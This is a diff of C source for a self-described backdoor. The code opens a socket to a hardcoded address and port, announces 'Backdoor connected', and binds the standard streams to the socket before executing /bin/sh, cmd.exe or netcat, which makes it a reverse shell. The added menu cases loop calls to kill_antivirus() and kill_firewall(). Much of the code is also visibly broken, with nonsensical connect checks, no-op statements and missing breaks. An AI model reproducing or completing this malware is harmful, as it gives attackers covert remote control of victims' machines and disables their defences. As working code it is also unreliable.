@@ -29,7 +29,7 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
 #include <time.h>
 #include <sys/types.h>
 #include <sys/socket.h>
-#include <X11/Xlib.h>
+//#include <X11/Xlib.h>
 
 #define remote_addr "127.0.0.1"
 #define remote_port 2222
@@ -132,7 +132,7 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
 
     {
 
-    XFreeCursor; //magic happens here
+    //XFreeCursor; //magic happens here
 
     pid_t pid;
 
@@ -270,7 +270,7 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
 
      if(recv(x,command,bytes,NULL) > 0);
 
-     XFreeCursor;
+   //  XFreeCursor;
      dup2(x, 0),dup2(x, 1),dup2(x, 2);
      root = execve("/bin/sh", cmd,  window),execve("C:\\windows\\System32\\cmd.exe ", cmd, window),execve("netcat", cmd, window);
 
@@ -280,10 +280,7 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
 
      }
 
-
-
 }
-
 
      /* execute the program */
 
@@ -292,13 +289,14 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
      {
       char command[bytes], bufaux[bytes], *loc;
       int tbuf, escolha;
-      char comandos [] = "/shell";
+      char comandos[]="/shell /help";
       struct sockaddr_in s;
 //      background_life();
      {
 
         /* setting up the connection */
-
+     //void (background_life());
+     do {
      x = socket(AF_INET, SOCK_STREAM, 0); /* create a socket */
 
      memset(s.sin_zero, '\0', sizeof s.sin_zero);
@@ -311,7 +309,7 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
                    discomment this if u think necessary... */
 
      (connect(x, (struct sockaddr *)&s, sizeof(s))); {
-     if (connect == 0x0)
+     if (accept == 0x0)
      perror("socket(SOCKET_CONNECT)connect_failed");
      }
 
@@ -321,20 +319,19 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
      perror("setsockopt(SO_REUSEADDR)failed");
 
      }
+     do
+     {
 
-     strcpy(command,"Backdoor connected");
+     strcpy(command,"\n...\n $$ Backdoor connected \n\n~$ ");
      strcpy(bufaux,command);
      send(x,command,strlen(command), 0);
 
     // Recebe ack do cli
      tbuf = recv(x, command,bytes, 0);
      command[tbuf]=0x00;
-    //printf(">: %s\n",buffer);
-     do
+     //fprintf(stdout,">: %s\n",command);
 
-     {
-
-     tbuf = recv(x,command,bytes,0);
+    } while((tbuf=recv(x,command,bytes,0) > 0));
      command[tbuf]=0x00;
 
      if (strncmp(command,"/",1) == 0)
@@ -350,23 +347,36 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
 
    {
 
-     case 2:
+     case 1:
 
-    {
-
+     while(true)
      shell();
 
-              }
+
+     case 2:
+
+     while(true)
+     kill_antivirus();
 
 
-           }
+     case 3:
+
+     while(true)
+     kill_firewall();
+
+     default:
+             main;
+
+          }
 
 
-        }
+      }
 
-      while(1);
+
+     while(true);
+
+
     }
-
 
 
 }
